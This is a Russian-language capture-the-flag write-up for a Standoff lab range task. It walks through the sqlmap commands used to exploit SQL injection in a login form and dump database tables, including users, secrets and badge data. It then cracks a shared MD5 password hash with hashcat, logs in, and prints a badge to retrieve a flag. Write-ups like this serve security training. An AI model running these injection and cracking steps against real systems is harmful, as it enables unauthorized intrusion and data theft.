Techcongress

Портал международной конференции STANDOFF TECH CONGRESS
Руководители ведущих отраслевых предприятий, высокопоставленные чиновники и известные общественные деятели вновь соберутся на ежегодном мероприятии STANDOFF TECH CONGRESS. Строгий контроль, пропускной режим и никаких журналистов - вопросы государственной важности останутся за плотно закрытыми дверями конференции.
Хост: techcongress.standalone.stf 10.124.249.11

Как всегда начинаем с nmap, ничего такого нет, заходим на веб
<img width="803" height="252" alt="image" src="https://github.com/user-attachments/assets/be70cfe1-1cc1-48bb-ae1c-7b4599c98f46" />

<img width="1392" height="837" alt="image" src="https://github.com/user-attachments/assets/28cc6669-8bf8-48b4-a00c-ae6d45b0c772" />

В сурсе тоже ничего особого нет, пробуем скулю на /login:

sqlmap -u "http://10.124.249.11/login" --data="name=test&password=test" --method=POST --level=5 --risk=3 --dbms=postgresql --batch --dbs

<img width="813" height="372" alt="image" src="https://github.com/user-attachments/assets/0683c567-da5c-48c7-acb8-47b4704b5f78" />

<img width="813" height="372" alt="image" src="https://github.com/user-attachments/assets/07c1989a-cf16-40c5-b7d5-4d6c76dfdd3f" />


sqlmap -u "http://10.124.249.11/login" --data="name=test&password=test" --method=POST --dbms=postgresql --batch -D public --tables

<img width="813" height="372" alt="image" src="https://github.com/user-attachments/assets/c08aca47-d244-445d-b676-2232385037e3" />

sqlmap -u "http://10.124.249.11/login" --data="name=test&password=test" --method=POST --dbms=postgresql --batch -D public -T secret --dump. Вытаскиваем флаг для SQLi

<img width="813" height="372" alt="image" src="https://github.com/user-attachments/assets/93f24d35-889d-4be2-aa05-516ba74a3223" />

<img width="1559" height="729" alt="image" src="https://github.com/user-attachments/assets/bbc8c108-5c6f-48b1-9b19-505991c34cf9" />


time-based скуля это ад...

sqlmap -u "http://10.124.249.11/login" --data="name=test&password=test" --method=POST --dbms=postgresql --batch -D public -T users --dump 
<img width="1091" height="902" alt="image" src="https://github.com/user-attachments/assets/5d77c77e-0e85-4f15-8500-4668f182d0ab" />
у всех пользователей один и тот же md5 хэш 81dc9bdb52d04dc20036dbd8313ed055, брутим его через hashcat, пароль оказывается 1234
<img width="1091" height="540" alt="image" src="https://github.com/user-attachments/assets/ec1dc126-b29e-4172-a6dd-15054e7664e5" />

Берем любую связку a.kovalev@petrostream.com:1234 заходим на сайт
<img width="1920" height="843" alt="image" src="https://github.com/user-attachments/assets/768c58ec-166e-4e9f-9cbb-44f152a5742f" />

Из скули sqlmap -u "http://10.124.249.11/login" --data="name=test&password=test" --method=POST --dbms=postgresql --batch -D public -T badges --dump



{
  "first_name": "Standoff",
  "last_name": "Xakep",
  "passport_number": 567890,
  "passport_series": 3456,
  "id": "0c038826-5b31-4de7-b129-333fee9176ef"
}


<img width="756" height="209" alt="image" src="https://github.com/user-attachments/assets/f832b1de-a0b6-4e50-97ce-94bd6c0f94c7" />






Принтим его и забираем флаг, http://techcongress.standalone.stf/badges/print/0c038826-5b31-4de7-b129-333fee9176ef


<img width="676" height="808" alt="image" src="https://github.com/user-attachments/assets/42625b4d-7597-40ac-847e-5a76245ed9c3" />
<img width="1359" height="515" alt="image" src="https://github.com/user-attachments/assets/108b37f5-5de0-4707-957c-f5ca313ff209" />
